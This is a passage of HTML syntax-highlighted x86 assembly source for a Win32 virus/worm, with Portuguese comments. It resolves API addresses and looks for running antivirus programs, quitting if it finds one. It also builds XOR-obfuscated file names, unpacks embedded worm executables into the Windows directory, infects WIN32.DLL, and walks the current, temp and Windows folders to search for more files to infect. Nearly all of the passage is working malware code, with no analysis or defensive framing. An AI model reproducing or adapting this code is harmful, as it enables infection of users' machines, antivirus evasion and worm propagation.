   </span><span class="sc5">CreateProcessA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">LoadLibraryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetProcAddressA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">SetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetTempPathA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lstrcpy</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">api@015</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">api@017</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc5">api@016</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api@016</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">api@017</span><span class="sc0">

   </span><span class="sc1">; acabamos de achar as api's</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc1">; onde nosso virus começa na memoria</span><span class="sc0">

   </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00401000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">; converter agora, os endereços para RUNTIME,</span><span class="sc0">
   </span><span class="sc1">; nao mais usando o registrador EBP, como</span><span class="sc0">
   </span><span class="sc1">; é de costume nos virus WIN32.</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@001</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00401000h</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@memory</span><span class="sc0">

   </span><span class="sc5">runtime@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sabia@001</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">runtime@001</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">runtime@001</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">runtime@001</span><span class="sc0">

   </span><span class="sc5">sabia@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chamada@001</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chamada@001</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maybe@001</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">saida@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maybe@001</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">))</span><span class="sc0">

   </span><span class="sc1">; agora que nosso codigo foi convertido para endereços</span><span class="sc0">
   </span><span class="sc1">; RUNTIME, podemos chamar tudo diretamente ;-P</span><span class="sc0">

   </span><span class="sc1">; verificar se existe algum antivirus ativo na memoria</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddressA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc1">; array de nomes de antivirus</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@002</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">anti@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">anti@005</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddressA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">anti@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; achar diretorio do windows, copiar o codigo do WORM</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@004</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrcpy</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'_EI\' xor '</span><span class="sc5">NBK</span><span class="sc12">' + '</span><span class="sc5">ANA</span><span class="sc12">' + '</span><span class="sc5">TAAT</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'TAAT'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'_EI\' xor '</span><span class="sc5">KCAP</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KCAP'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">depack@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sabia@002</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">play@001</span><span class="sc0">

   </span><span class="sc9">ELSE</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HIDE@001</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrlen</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NIW\' xor '</span><span class="sc5">NBK</span><span class="sc12">' + '</span><span class="sc5">ANA</span><span class="sc12">' + '</span><span class="sc4">&lt;:</span><span class="sc5">O</span><span class="sc4">~</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'&lt;:O~'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NIW\' xor '</span><span class="sc5">D.23</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D.23'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'LL'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CopyFileA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sabia@002</span><span class="sc0">

   </span><span class="sc1">; devemos infectar a WIN32.DLL agora</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrcpy</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sabia@002</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infectar@001</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HIDE@001</span><span class="sc0">

   </span><span class="sc5">sabia@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XTM\' xor '</span><span class="sc5">NBK</span><span class="sc12">' + '</span><span class="sc5">ANA</span><span class="sc12">' + '</span><span class="sc5">????</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'????'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XTM\' xor '</span><span class="sc5">XE._</span><span class="sc13">'
</span><span class="sc0">   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XE._'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@002</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">depack@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sabia@003</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">play@001</span><span class="sc0">

   </span><span class="sc9">ELSE</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HIDE@001</span><span class="sc0">

   </span><span class="sc5">sabia@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sabia@008</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetTempPathA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sabia@008</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sabia@008</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc5">sabia@008</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sabia@010</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">sabia@010</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc5">STR1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc13">'*.*\'
</span><span class="sc0">   </span><span class="sc5">STR2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc5">STR3</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">

   </span><span class="sc9">ELSE</span><span class="sc0">

   </span><span class="sc5">STR1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc13">'AOG\'
</span><span class="sc0">   </span><span class="sc5">STR2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'*.*T'</span><span class="sc0">
   </span><span class="sc5">STR3</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STR1</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STR2</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STR3</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@006</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">

